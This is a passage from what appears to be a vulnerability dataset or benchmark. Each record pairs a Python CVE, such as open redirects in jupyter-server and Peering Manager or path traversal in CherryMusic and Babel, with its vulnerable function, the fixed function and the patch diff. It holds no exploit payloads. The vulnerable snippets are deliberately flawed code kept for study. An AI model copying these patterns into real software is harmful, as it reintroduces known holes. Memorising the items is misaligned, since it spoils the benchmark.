setup_initial_streams(realm)\n        assert(realm is not None)\n\n        full_name = form.cleaned_data['full_name']\n        short_name = email_to_username(email)\n\n        timezone = u\"\"\n        if 'timezone' in request.POST and request.POST['timezone'] in get_all_timezones():\n            timezone = request.POST['timezone']\n\n        try:\n            existing_user_profile = get_user_profile_by_email(email)\n        except UserProfile.DoesNotExist:\n            existing_user_profile = None\n\n        return_data = {}  # type: Dict[str, bool]\n        if ldap_auth_enabled(realm):\n            # If the user was authenticated using an external SSO\n            # mechanism like Google or GitHub auth, then authentication\n            # will have already been done before creating the\n            # PreregistrationUser object with password_required=False, and\n            # so we don't need to worry about passwords.\n            #\n            # If instead the realm is using EmailAuthBackend, we will\n            # set their password above.\n            #\n            # But if the realm is using LDAPAuthBackend, we need to verify\n            # their LDAP password (which will, as a side effect, create\n            # the user account) here using authenticate.\n            auth_result = authenticate(request,\n                                       username=email,\n                                       password=password,\n                                       realm_subdomain=realm.subdomain,\n                                       return_data=return_data)\n            if auth_result is None:\n                # TODO: This probably isn't going to give a\n                # user-friendly error message, but it doesn't\n                # particularly matter, because the registration form\n                # is hidden for most users.\n                return HttpResponseRedirect(reverse('django.contrib.auth.views.login') + '?email=' +\n                                            urllib.parse.quote_plus(email))\n\n            # Since we'll have created a user, we now just log them in.\n            return login_and_go_to_home(request, auth_result)\n        elif existing_user_profile is not None and existing_user_profile.is_mirror_dummy:\n            user_profile = existing_user_profile\n            do_activate_user(user_profile)\n            do_change_password(user_profile, password)\n            do_change_full_name(user_profile, full_name, user_profile)\n            do_set_user_display_setting(user_profile, 'timezone', timezone)\n        else:\n            user_profile = do_create_user(email, password, realm, full_name, short_name,\n                                          prereg_user=prereg_user, is_realm_admin=realm_creation,\n                                          tos_version=settings.TOS_VERSION,\n                                          timezone=timezone,\n                                          newsletter_data={\"IP\": request.META['REMOTE_ADDR']})\n\n        # Note: Any logic like this must also be replicated in\n        # ZulipLDAPAuthBackend and zerver/views/users.py.  This is\n        # ripe for a refactoring, though care is required to avoid\n        # import loops with zerver/lib/actions.py and zerver/lib/onboarding.py.\n        send_initial_pms(user_profile)\n\n        if realm_creation:\n            setup_initial_private_stream(user_profile)\n            send_initial_realm_messages(realm)\n\n        if realm_creation:\n            # Because for realm creation, registration happens on the\n            # root domain, we need to log them into the subdomain for\n            # their new realm.\n            return redirect_and_log_into_subdomain(realm, full_name, email)\n\n        # This dummy_backend check below confirms the user is\n        # authenticating to the correct subdomain.\n        auth_result = authenticate(username=user_profile.email,\n                                   realm_subdomain=realm.subdomain,\n                                   return_data=return_data,\n                                   use_dummy_backend=True)\n        if return_data.get('invalid_subdomain'):\n            # By construction, this should never happen.\n            logging.error(\"Subdomain mismatch in registration %s: %s\" % (\n                realm.subdomain, user_profile.email,))\n            return redirect('/')\n\n        return login_and_go_to_home(request, auth_result)\n\n    return render(\n        request,\n        'zerver/register.html',\n        context={'form': form,\n                 'email': email,\n                 'key': key,\n                 'full_name': request.session.get('authenticated_full_name', None),\n                 'lock_name': name_validated and name_changes_disabled(realm),\n                 # password_auth_enabled is normally set via our context processor,\n                 # but for the registration form, there is no logged in user yet, so\n                 # we have to set it here.\n                 'creating_new_team': realm_creation,\n                 'password_required': password_auth_enabled(realm) and password_required,\n                 'password_auth_enabled': password_auth_enabled(realm),\n                 'root_domain_available': is_root_domain_available(),\n                 'MAX_REALM_NAME_LENGTH': str(Realm.MAX_REALM_NAME_LENGTH),\n                 'MAX_NAME_LENGTH': str(UserProfile.MAX_NAME_LENGTH),\n                 'MAX_PASSWORD_LENGTH': str(form.MAX_PASSWORD_LENGTH),\n                 'MAX_REALM_SUBDOMAIN_LENGTH': str(Realm.MAX_REALM_SUBDOMAIN_LENGTH)\n                 }\n    )"
      }
    ],
    "vul_patch": "--- a/zerver/views/registration.py\n+++ b/zerver/views/registration.py\n@@ -13,7 +13,9 @@\n         realm = None\n     else:\n         realm = get_realm(get_subdomain(request))\n-        if prereg_user.realm is not None and prereg_user.realm != realm:\n+        if prereg_user.realm is None:\n+            return render(request, 'confirmation/link_expired.html')\n+        if prereg_user.realm != realm:\n             return render(request, 'confirmation/link_does_not_exist.html')\n \n     if realm and not email_allowed_for_realm(email, realm):\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2023-39968",
    "cve_description": "jupyter-server is the backend for Jupyter web applications. Open Redirect Vulnerability. Maliciously crafted login links to known Jupyter Servers can cause successful login or an already logged-in session to be redirected to arbitrary sites, which should be restricted to Jupyter Server-served URLs. This issue has been addressed in commit `29036259` which is included in release 2.7.2. Users are advised to upgrade. There are no known workarounds for this vulnerability.",
    "cwe_info": {
      "CWE-601": {
        "name": "URL Redirection to Untrusted Site ('Open Redirect')",
        "description": "The web application accepts a user-controlled input that specifies a link to an external site, and uses that link in a redirect."
      }
    },
    "repo": "https://github.com/jupyter-server/jupyter_server",
    "patch_url": [
      "https://github.com/jupyter-server/jupyter_server/commit/290362593b2ffb23c59f8114d76f77875de4b925"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_220_1",
        "commit": "87a4927",
        "file_path": "jupyter_server/auth/login.py",
        "start_line": 31,
        "end_line": 61,
        "snippet": "    def _redirect_safe(self, url, default=None):\n        \"\"\"Redirect if url is on our PATH\n\n        Full-domain redirects are allowed if they pass our CORS origin checks.\n\n        Otherwise use default (self.base_url if unspecified).\n        \"\"\"\n        if default is None:\n            default = self.base_url\n        # protect chrome users from mishandling unescaped backslashes.\n        # \\ is not valid in urls, but some browsers treat it as /\n        # instead of %5C, causing `\\\\` to behave as `//`\n        url = url.replace(\"\\\\\", \"%5C\")\n        parsed = urlparse(url)\n        if parsed.netloc or not (parsed.path + \"/\").startswith(self.base_url):\n            # require that next_url be absolute path within our path\n            allow = False\n            # OR pass our cross-origin check\n            if parsed.netloc:\n                # if full URL, run our cross-origin check:\n                origin = f\"{parsed.scheme}://{parsed.netloc}\"\n                origin = origin.lower()\n                if self.allow_origin:\n                    allow = self.allow_origin == origin\n                elif self.allow_origin_pat:\n                    allow = bool(re.match(self.allow_origin_pat, origin))\n            if not allow:\n                # not allowed, use default\n                self.log.warning(\"Not allowing login redirect to %r\" % url)\n                url = default\n        self.redirect(url)"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_220_1",
        "commit": "2903625",
        "file_path": "jupyter_server/auth/login.py",
        "start_line": 31,
        "end_line": 74,
        "snippet": "    def _redirect_safe(self, url, default=None):\n        \"\"\"Redirect if url is on our PATH\n\n        Full-domain redirects are allowed if they pass our CORS origin checks.\n\n        Otherwise use default (self.base_url if unspecified).\n        \"\"\"\n        if default is None:\n            default = self.base_url\n        # protect chrome users from mishandling unescaped backslashes.\n        # \\ is not valid in urls, but some browsers treat it as /\n        # instead of %5C, causing `\\\\` to behave as `//`\n        url = url.replace(\"\\\\\", \"%5C\")\n        # urllib and browsers interpret extra '/' in the scheme separator (`scheme:///host/path`)\n        # differently.\n        # urllib gives scheme=scheme, netloc='', path='/host/path', while\n        # browsers get scheme=scheme, netloc='host', path='/path'\n        # so make sure ':///*' collapses to '://' by splitting and stripping any additional leading slash\n        # don't allow any kind of `:/` shenanigans by splitting on ':' only\n        # and replacing `:/*` with exactly `://`\n        if \":\" in url:\n            scheme, _, rest = url.partition(\":\")\n            url = f\"{scheme}://{rest.lstrip('/')}\"\n        parsed = urlparse(url)\n        # full url may be `//host/path` (empty scheme == same scheme as request)\n        # or `https://host/path`\n        # or even `https:///host/path` (invalid, but accepted and ambiguously interpreted)\n        if (parsed.scheme or parsed.netloc) or not (parsed.path + \"/\").startswith(self.base_url):\n            # require that next_url be absolute path within our path\n            allow = False\n            # OR pass our cross-origin check\n            if parsed.scheme or parsed.netloc:\n                # if full URL, run our cross-origin check:\n                origin = f\"{parsed.scheme}://{parsed.netloc}\"\n                origin = origin.lower()\n                if self.allow_origin:\n                    allow = self.allow_origin == origin\n                elif self.allow_origin_pat:\n                    allow = bool(re.match(self.allow_origin_pat, origin))\n            if not allow:\n                # not allowed, use default\n                self.log.warning(\"Not allowing login redirect to %r\" % url)\n                url = default\n        self.redirect(url)"
      }
    ],
    "vul_patch": "--- a/jupyter_server/auth/login.py\n+++ b/jupyter_server/auth/login.py\n@@ -11,12 +11,25 @@\n         # \\ is not valid in urls, but some browsers treat it as /\n         # instead of %5C, causing `\\\\` to behave as `//`\n         url = url.replace(\"\\\\\", \"%5C\")\n+        # urllib and browsers interpret extra '/' in the scheme separator (`scheme:///host/path`)\n+        # differently.\n+        # urllib gives scheme=scheme, netloc='', path='/host/path', while\n+        # browsers get scheme=scheme, netloc='host', path='/path'\n+        # so make sure ':///*' collapses to '://' by splitting and stripping any additional leading slash\n+        # don't allow any kind of `:/` shenanigans by splitting on ':' only\n+        # and replacing `:/*` with exactly `://`\n+        if \":\" in url:\n+            scheme, _, rest = url.partition(\":\")\n+            url = f\"{scheme}://{rest.lstrip('/')}\"\n         parsed = urlparse(url)\n-        if parsed.netloc or not (parsed.path + \"/\").startswith(self.base_url):\n+        # full url may be `//host/path` (empty scheme == same scheme as request)\n+        # or `https://host/path`\n+        # or even `https:///host/path` (invalid, but accepted and ambiguously interpreted)\n+        if (parsed.scheme or parsed.netloc) or not (parsed.path + \"/\").startswith(self.base_url):\n             # require that next_url be absolute path within our path\n             allow = False\n             # OR pass our cross-origin check\n-            if parsed.netloc:\n+            if parsed.scheme or parsed.netloc:\n                 # if full URL, run our cross-origin check:\n                 origin = f\"{parsed.scheme}://{parsed.netloc}\"\n                 origin = origin.lower()\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2024-28113",
    "cve_description": "Peering Manager is a BGP session management tool. In Peering Manager <=1.8.2, it is possible to redirect users to an arbitrary page using a crafted url. As a result users can be redirected to an unexpected location. This issue has been addressed in version 1.8.3. Users are advised to upgrade. There are no known workarounds for this vulnerability.",
    "cwe_info": {
      "CWE-601": {
        "name": "URL Redirection to Untrusted Site ('Open Redirect')",
        "description": "The web application accepts a user-controlled input that specifies a link to an external site, and uses that link in a redirect."
      }
    },
    "repo": "https://github.com/peering-manager/peering-manager",
    "patch_url": [
      "https://github.com/peering-manager/peering-manager/commit/49dc5593184d7740d81e57dbbe3f971d2969dfac"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_219_1",
        "commit": "8a865fb",
        "file_path": "utils/views.py",
        "start_line": 38,
        "end_line": 43,
        "snippet": "    def get_return_url(self, request, instance=None):\n        # Check if `return_url` was specified as a query parameter or form\n        # data, use this URL only if it's safe\n        return_url = request.GET.get(\"return_url\") or request.POST.get(\"return_url\")\n        if return_url and return_url.startswith(\"/\"):\n            return return_url"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_219_1",
        "commit": "49dc559",
        "file_path": "utils/views.py",
        "start_line": 40,
        "end_line": 45,
        "snippet": "    def get_return_url(self, request, instance=None):\n        # Check if `return_url` was specified as a query parameter or form\n        # data, use this URL only if it's not absolute\n        return_url = request.GET.get(\"return_url\") or request.POST.get(\"return_url\")\n        if return_url and not bool(urlparse(return_url).netloc):\n            return return_url"
      }
    ],
    "vul_patch": "--- a/utils/views.py\n+++ b/utils/views.py\n@@ -1,6 +1,6 @@\n     def get_return_url(self, request, instance=None):\n         # Check if `return_url` was specified as a query parameter or form\n-        # data, use this URL only if it's safe\n+        # data, use this URL only if it's not absolute\n         return_url = request.GET.get(\"return_url\") or request.POST.get(\"return_url\")\n-        if return_url and return_url.startswith(\"/\"):\n+        if return_url and not bool(urlparse(return_url).netloc):\n             return return_url\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2015-8309",
    "cve_description": "Directory traversal vulnerability in Cherry Music before 0.36.0 allows remote authenticated users to read arbitrary files via the \"value\" parameter to \"download.\"",
    "cwe_info": {
      "CWE-73": {
        "name": "External Control of File Name or Path",
        "description": "The product allows user input to control or influence paths or file names that are used in filesystem operations."
      },
      "CWE-22": {
        "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')",
        "description": "The product uses external input to construct a pathname that is intended to identify a file or directory that is located underneath a restricted parent directory, but the product does not properly neutralize special elements within the pathname that can cause the pathname to resolve to a location that is outside of the restricted directory."
      }
    },
    "repo": "https://github.com/devsnd/cherrymusic",
    "patch_url": [
      "https://github.com/devsnd/cherrymusic/commit/62dec34a1ea0741400dd6b6c660d303dcd651e86"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_199_1",
        "commit": "82ad793",
        "file_path": "cherrymusicserver/httphandler.py",
        "start_line": 295,
        "end_line": 313,
        "snippet": "    def download_check_files(self, filelist):\n        # only admins and allowed users may download\n        if not cherrypy.session['admin']:\n            uo = self.useroptions.forUser(self.getUserId())\n            if not uo.getOptionValue('media.may_download'):\n                return 'not_permitted'\n        # make sure nobody tries to escape from basedir\n        for f in filelist:\n            if '/../' in f:\n                return 'invalid_file'\n        # make sure all files are smaller than maximum download size\n        size_limit = cherry.config['media.maximum_download_size']\n        try:\n            if self.model.file_size_within_limit(filelist, size_limit):\n                return 'ok'\n            else:\n                return 'too_big'\n        except OSError as e:        # use OSError for python2 compatibility\n            return str(e)"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_199_1",
        "commit": "62dec34",
        "file_path": "cherrymusicserver/httphandler.py",
        "start_line": 295,
        "end_line": 317,
        "snippet": "    def download_check_files(self, filelist):\n        # only admins and allowed users may download\n        if not cherrypy.session['admin']:\n            uo = self.useroptions.forUser(self.getUserId())\n            if not uo.getOptionValue('media.may_download'):\n                return 'not_permitted'\n        # make sure nobody tries to escape from basedir\n        for f in filelist:\n            # don't allow to traverse up in the file system\n            if '/../' in f or f.startswith('../'):\n                return 'invalid_file'\n            # CVE-2015-8309: do not allow absolute file paths\n            if os.path.isabs(f):\n                return 'invalid_file'\n        # make sure all files are smaller than maximum download size\n        size_limit = cherry.config['media.maximum_download_size']\n        try:\n            if self.model.file_size_within_limit(filelist, size_limit):\n                return 'ok'\n            else:\n                return 'too_big'\n        except OSError as e:        # use OSError for python2 compatibility\n            return str(e)"
      }
    ],
    "vul_patch": "--- a/cherrymusicserver/httphandler.py\n+++ b/cherrymusicserver/httphandler.py\n@@ -6,7 +6,11 @@\n                 return 'not_permitted'\n         # make sure nobody tries to escape from basedir\n         for f in filelist:\n-            if '/../' in f:\n+            # don't allow to traverse up in the file system\n+            if '/../' in f or f.startswith('../'):\n+                return 'invalid_file'\n+            # CVE-2015-8309: do not allow absolute file paths\n+            if os.path.isabs(f):\n                 return 'invalid_file'\n         # make sure all files are smaller than maximum download size\n         size_limit = cherry.config['media.maximum_download_size']\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2021-42771",
    "cve_description": "Babel.Locale in Babel before 2.9.1 allows attackers to load arbitrary locale .dat files (containing serialized Python objects) via directory traversal, leading to code execution.",
    "cwe_info": {
      "CWE-73": {
        "name": "External Control of File Name or Path",
        "description": "The product allows user input to control or influence paths or file names that are used in filesystem operations."
      },
      "CWE-22": {
        "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')",
        "description": "The product uses external input to construct a pathname that is intended to identify a file or directory that is located underneath a restricted parent directory, but the product does not properly neutralize special elements within the pathname that can cause the pathname to resolve to a location that is outside of the restricted directory."
      }
    },
    "repo": "https://github.com/python-babel/babel",
    "patch_url": [
      "https://github.com/python-babel/babel/commit/412015ef642bfcc0d8ba8f4d05cdbb6aac98d9b3"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_331_1",
        "commit": "5afe2b2",
        "file_path": "babel/localedata.py",
        "start_line": 41,
        "end_line": 53,
        "snippet": "def exists(name):\n    \"\"\"Check whether locale data is available for the given locale.\n\n    Returns `True` if it exists, `False` otherwise.\n\n    :param name: the locale identifier string\n    \"\"\"\n    if not name or not isinstance(name, string_types):\n        return False\n    if name in _cache:\n        return True\n    file_found = os.path.exists(os.path.join(_dirname, '%s.dat' % name))\n    return True if file_found else bool(normalize_locale(name))"
      },
      {
        "id": "vul_py_331_2",
        "commit": "5afe2b2",
        "file_path": "babel/localedata.py",
        "start_line": 56,
        "end_line": 131,
        "snippet": "def locale_identifiers():\n    \"\"\"Return a list of all locale identifiers for which locale data is\n    available.\n\n    This data is cached after the first invocation in `locale_identifiers.cache`.\n\n    Removing the `locale_identifiers.cache` attribute or setting it to `None`\n    will cause this function to re-read the list from disk.\n\n    .. versionadded:: 0.8.1\n\n    :return: a list of locale identifiers (strings)\n    \"\"\"\n    data = getattr(locale_identifiers, 'cache', None)\n    if data is None:\n        locale_identifiers.cache = data = [\n            stem\n            for stem, extension in\n            (os.path.splitext(filename) for filename in os.listdir(_dirname))\n            if extension == '.dat' and stem != 'root'\n        ]\n    return data\n\n\ndef load(name, merge_inherited=True):\n    \"\"\"Load the locale data for the given locale.\n\n    The locale data is a dictionary that contains much of the data defined by\n    the Common Locale Data Repository (CLDR). This data is stored as a\n    collection of pickle files inside the ``babel`` package.\n\n    >>> d = load('en_US')\n    >>> d['languages']['sv']\n    u'Swedish'\n\n    Note that the results are cached, and subsequent requests for the same\n    locale return the same dictionary:\n\n    >>> d1 = load('en_US')\n    >>> d2 = load('en_US')\n    >>> d1 is d2\n    True\n\n    :param name: the locale identifier string (or \"root\")\n    :param merge_inherited: whether the inherited data should be merged into\n                            the data of the requested locale\n    :raise `IOError`: if no locale data file is found for the given locale\n                      identifer, or one of the locales it inherits from\n    \"\"\"\n    _cache_lock.acquire()\n    try:\n        data = _cache.get(name)\n        if not data:\n            # Load inherited data\n            if name == 'root' or not merge_inherited:\n                data = {}\n            else:\n                from babel.core import get_global\n                parent = get_global('parent_exceptions').get(name)\n                if not parent:\n                    parts = name.split('_')\n                    if len(parts) == 1:\n                        parent = 'root'\n                    else:\n                        parent = '_'.join(parts[:-1])\n                data = load(parent).copy()\n            filename = os.path.join(_dirname, '%s.dat' % name)\n            with open(filename, 'rb') as fileobj:\n                if name != 'root' and merge_inherited:\n                    merge(data, pickle.load(fileobj))\n                else:\n                    data = pickle.load(fileobj)\n            _cache[name] = data\n        return data\n    finally:\n        _cache_lock.release()"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_331_1",
        "commit": "412015ef642bfcc0d8ba8f4d05cdbb6aac98d9b3",
        "file_path": "babel/localedata.py",
        "start_line": 60,
        "end_line": 72,
        "snippet": "def exists(name):\n    \"\"\"Check whether locale data is available for the given locale.\n\n    Returns `True` if it exists, `False` otherwise.\n\n    :param name: the locale identifier string\n    \"\"\"\n    if not name or not isinstance(name, string_types):\n        return False\n    if name in _cache:\n        return True\n    file_found = os.path.exists(resolve_locale_filename(name))\n    return True if file_found else bool(normalize_locale(name))"
      },
      {
        "id": "fix_py_331_2",
        "commit": "412015ef642bfcc0d8ba8f4d05cdbb6aac98d9b3",
        "file_path": "babel/localedata.py",
        "start_line": 75,
        "end_line": 151,
        "snippet": "def locale_identifiers():\n    \"\"\"Return a list of all locale identifiers for which locale data is\n    available.\n\n    This data is cached after the first invocation in `locale_identifiers.cache`.\n\n    Removing the `locale_identifiers.cache` attribute or setting it to `None`\n    will cause this function to re-read the list from disk.\n\n    .. versionadded:: 0.8.1\n\n    :return: a list of locale identifiers (strings)\n    \"\"\"\n    data = getattr(locale_identifiers, 'cache', None)\n    if data is None:\n        locale_identifiers.cache = data = [\n            stem\n            for stem, extension in\n            (os.path.splitext(filename) for filename in os.listdir(_dirname))\n            if extension == '.dat' and stem != 'root'\n        ]\n    return data\n\n\ndef load(name, merge_inherited=True):\n    \"\"\"Load the locale data for the given locale.\n\n    The locale data is a dictionary that contains much of the data defined by\n    the Common Locale Data Repository (CLDR). This data is stored as a\n    collection of pickle files inside the ``babel`` package.\n\n    >>> d = load('en_US')\n    >>> d['languages']['sv']\n    u'Swedish'\n\n    Note that the results are cached, and subsequent requests for the same\n    locale return the same dictionary:\n\n    >>> d1 = load('en_US')\n    >>> d2 = load('en_US')\n    >>> d1 is d2\n    True\n\n    :param name: the locale identifier string (or \"root\")\n    :param merge_inherited: whether the inherited data should be merged into\n                            the data of the requested locale\n    :raise `IOError`: if no locale data file is found for the given locale\n                      identifer, or one of the locales it inherits from\n    \"\"\"\n    name = os.path.basename(name)\n    _cache_lock.acquire()\n    try:\n        data = _cache.get(name)\n        if not data:\n            # Load inherited data\n            if name == 'root' or not merge_inherited:\n                data = {}\n            else:\n                from babel.core import get_global\n                parent = get_global('parent_exceptions').get(name)\n                if not parent:\n                    parts = name.split('_')\n                    if len(parts) == 1:\n                        parent = 'root'\n                    else:\n                        parent = '_'.join(parts[:-1])\n                data = load(parent).copy()\n            filename = resolve_locale_filename(name)\n            with open(filename, 'rb') as fileobj:\n                if name != 'root' and merge_inherited:\n                    merge(data, pickle.load(fileobj))\n                else:\n                    data = pickle.load(fileobj)\n            _cache[name] = data\n        return data\n    finally:\n        _cache_lock.release()"
      },
      {
        "id": "fix_py_331_3",
        "commit": "412015ef642bfcc0d8ba8f4d05cdbb6aac98d9b3",
        "file_path": "babel/localedata.py",
        "start_line": 44,
        "end_line": 59,
        "snippet": "def resolve_locale_filename(name):\n    \"\"\"\n    Resolve a locale identifier to a `.dat` path on disk.\n    \"\"\"\n\n    # Clean up any possible relative paths.\n    name = os.path.basename(name)\n\n    # Ensure we're not left with one of the Windows reserved names.\n    if sys.platform == \"win32\" and _windows_reserved_name_re.match(os.path.splitext(name)[0]):\n        raise ValueError(\"Name %s is invalid on Windows\" % name)\n\n    # Build the path.\n    return os.path.join(_dirname, '%s.dat' % name)\n\n"
      },
      {
        "id": "fix_py_331_4",
        "commit": "412015ef642bfcc0d8ba8f4d05cdbb6aac98d9b3",
        "file_path": "babel/localedata.py",
        "start_line": 27,
        "end_line": 27,
        "snippet": "_windows_reserved_name_re = re.compile(\"^(con|prn|aux|nul|com[0-9]|lpt[0-9])$\", re.I)"
      }
    ],
    "vul_patch": "--- a/babel/localedata.py\n+++ b/babel/localedata.py\n@@ -9,5 +9,5 @@\n         return False\n     if name in _cache:\n         return True\n-    file_found = os.path.exists(os.path.join(_dirname, '%s.dat' % name))\n+    file_found = os.path.exists(resolve_locale_filename(name))\n     return True if file_found else bool(normalize_locale(name))\n\n--- a/babel/localedata.py\n+++ b/babel/localedata.py\n@@ -47,6 +47,7 @@\n     :raise `IOError`: if no locale data file is found for the given locale\n                       identifer, or one of the locales it inherits from\n     \"\"\"\n+    name = os.path.basename(name)\n     _cache_lock.acquire()\n     try:\n         data = _cache.get(name)\n@@ -64,7 +65,7 @@\n                     else:\n                         parent = '_'.join(parts[:-1])\n                 data = load(parent).copy()\n-            filename = os.path.join(_dirname, '%s.dat' % name)\n+            filename = resolve_locale_filename(name)\n             with open(filename, 'rb') as fileobj:\n                 if name != 'root' and merge_inherited:\n                     merge(data, pickle.load(fileobj))\n\n--- /dev/null\n+++ b/babel/localedata.py\n@@ -0,0 +1,15 @@\n+def resolve_locale_filename(name):\n+    \"\"\"\n+    Resolve a locale identifier to a `.dat` path on disk.\n+    \"\"\"\n+\n+    # Clean up any possible relative paths.\n+    name = os.path.basename(name)\n+\n+    # Ensure we're not left with one of the Windows reserved names.\n+    if sys.platform == \"win32\" and _windows_reserved_name_re.match(os.path.splitext(name)[0]):\n+        raise ValueError(\"Name %s is invalid on Windows\" % name)\n+\n+    # Build the path.\n+    return os.path.join(_dirname, '%s.dat' % name)\n+\n\n--- /dev/null\n+++ b/babel/localedata.py\n@@ -0,0 +1 @@\n+_windows_reserved_name_re = re.compile(\"^(con|prn|aux|nul|com[0-9]|lpt[0-9])$\", re.I)\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2022-23607",
    "cve_description": "treq is an HTTP library inspired by requests but written on top of Twisted's Agents. Treq's request methods (`treq.get`, `treq.post`, etc.) and `treq.client.HTTPClient` constructor accept cookies as a dictionary. Such cookies are not bound to a single domain, and are therefore sent to *every* domain (\"supercookies\"). This can potentially cause sensitive information to leak upon an HTTP redirect to a different domain., e.g. should `https://example.com` redirect to `http://cloudstorageprovider.com` the latter will receive the cookie `session`. Treq 2021.1.0 and later bind cookies given to request methods (`treq.request`, `treq.get`, `HTTPClient.request`, `HTTPClient.get`, etc.) to the origin of the *url* parameter. Users are advised to upgrade. For users unable to upgrade Instead of passing a dictionary as the *cookies* argument, pass a `http.cookiejar.CookieJar` instance with properly domain- and scheme-scoped cookies in it.",
    "cwe_info": {
      "CWE-601": {
        "name": "URL Redirection to Untrusted Site ('Open Redirect')",
        "description": "The web application accepts a user-controlled input that specifies a link to an external site, and uses that link in a redirect."
      }
    },
    "repo": "https://github.com/twisted/treq",
    "patch_url": [
      "https://github.com/twisted/treq/commit/1da6022cc880bbcff59321abe02bf8498b89efb2"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_178_1",
        "commit": "d89d553",
        "file_path": "src/treq/client.py",
        "start_line": 98,
        "end_line": 102,
        "snippet": "    def __init__(self, agent, cookiejar=None,\n                 data_to_body_producer=IBodyProducer):\n        self._agent = agent\n        self._cookiejar = cookiejar or cookiejar_from_dict({})\n        self._data_to_body_producer = data_to_body_producer"
      },
      {
        "id": "vul_py_178_2",
        "commit": "d89d553",
        "file_path": "src/treq/client.py",
        "start_line": 146,
        "end_line": 234,
        "snippet": "    def request(\n        self,\n        method,\n        url,\n        *,\n        params=None,\n        headers=None,\n        data=None,\n        files=None,\n        json=_NOTHING,\n        auth=None,\n        cookies=None,\n        allow_redirects=True,\n        browser_like_redirects=False,\n        unbuffered=False,\n        reactor=None,\n        timeout=None,\n        _stacklevel=2,\n    ):\n        \"\"\"\n        See :func:`treq.request()`.\n        \"\"\"\n        method = method.encode('ascii').upper()\n\n        if isinstance(url, DecodedURL):\n            parsed_url = url.encoded_url\n        elif isinstance(url, EncodedURL):\n            parsed_url = url\n        elif isinstance(url, str):\n            # We use hyperlink in lazy mode so that users can pass arbitrary\n            # bytes in the path and querystring.\n            parsed_url = EncodedURL.from_text(url)\n        else:\n            parsed_url = EncodedURL.from_text(url.decode('ascii'))\n\n        # Join parameters provided in the URL\n        # and the ones passed as argument.\n        if params:\n            parsed_url = parsed_url.replace(\n                query=parsed_url.query + tuple(_coerced_query_params(params))\n            )\n\n        url = parsed_url.to_uri().to_text().encode('ascii')\n\n        headers = self._request_headers(headers, _stacklevel + 1)\n\n        bodyProducer, contentType = self._request_body(data, files, json,\n                                                       stacklevel=_stacklevel + 1)\n        if contentType is not None:\n            headers.setRawHeaders(b'Content-Type', [contentType])\n\n        if not isinstance(cookies, CookieJar):\n            cookies = cookiejar_from_dict(cookies)\n\n        cookies = merge_cookies(self._cookiejar, cookies)\n        wrapped_agent = CookieAgent(self._agent, cookies)\n\n        if allow_redirects:\n            if browser_like_redirects:\n                wrapped_agent = BrowserLikeRedirectAgent(wrapped_agent)\n            else:\n                wrapped_agent = RedirectAgent(wrapped_agent)\n\n        wrapped_agent = ContentDecoderAgent(wrapped_agent,\n                                            [(b'gzip', GzipDecoder)])\n\n        if auth:\n            wrapped_agent = add_auth(wrapped_agent, auth)\n\n        d = wrapped_agent.request(\n            method, url, headers=headers,\n            bodyProducer=bodyProducer)\n\n        if reactor is None:\n            from twisted.internet import reactor\n        if timeout:\n            delayedCall = reactor.callLater(timeout, d.cancel)\n\n            def gotResult(result):\n                if delayedCall.active():\n                    delayedCall.cancel()\n                return result\n\n            d.addBoth(gotResult)\n\n        if not unbuffered:\n            d.addCallback(_BufferedResponse)\n\n        return d.addCallback(_Response, cookies)"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_178_1",
        "commit": "1da6022",
        "file_path": "src/treq/client.py",
        "start_line": 148,
        "end_line": 154,
        "snippet": "    def __init__(self, agent, cookiejar=None,\n                 data_to_body_producer=IBodyProducer):\n        self._agent = agent\n        if cookiejar is None:\n            cookiejar = CookieJar()\n        self._cookiejar = cookiejar\n        self._data_to_body_producer = data_to_body_producer"
      },
      {
        "id": "fix_py_178_2",
        "commit": "1da6022",
        "file_path": "src/treq/client.py",
        "start_line": 198,
        "end_line": 286,
        "snippet": "    def request(\n        self,\n        method,\n        url,\n        *,\n        params=None,\n        headers=None,\n        data=None,\n        files=None,\n        json=_NOTHING,\n        auth=None,\n        cookies=None,\n        allow_redirects=True,\n        browser_like_redirects=False,\n        unbuffered=False,\n        reactor=None,\n        timeout=None,\n        _stacklevel=2,\n    ):\n        \"\"\"\n        See :func:`treq.request()`.\n        \"\"\"\n        method = method.encode('ascii').upper()\n\n        if isinstance(url, DecodedURL):\n            parsed_url = url.encoded_url\n        elif isinstance(url, EncodedURL):\n            parsed_url = url\n        elif isinstance(url, str):\n            # We use hyperlink in lazy mode so that users can pass arbitrary\n            # bytes in the path and querystring.\n            parsed_url = EncodedURL.from_text(url)\n        else:\n            parsed_url = EncodedURL.from_text(url.decode('ascii'))\n\n        # Join parameters provided in the URL\n        # and the ones passed as argument.\n        if params:\n            parsed_url = parsed_url.replace(\n                query=parsed_url.query + tuple(_coerced_query_params(params))\n            )\n\n        url = parsed_url.to_uri().to_text().encode('ascii')\n\n        headers = self._request_headers(headers, _stacklevel + 1)\n\n        bodyProducer, contentType = self._request_body(data, files, json,\n                                                       stacklevel=_stacklevel + 1)\n        if contentType is not None:\n            headers.setRawHeaders(b'Content-Type', [contentType])\n\n        if not isinstance(cookies, CookieJar):\n            cookies = _scoped_cookiejar_from_dict(parsed_url, cookies)\n\n        cookies = merge_cookies(self._cookiejar, cookies)\n        wrapped_agent = CookieAgent(self._agent, cookies)\n\n        if allow_redirects:\n            if browser_like_redirects:\n                wrapped_agent = BrowserLikeRedirectAgent(wrapped_agent)\n            else:\n                wrapped_agent = 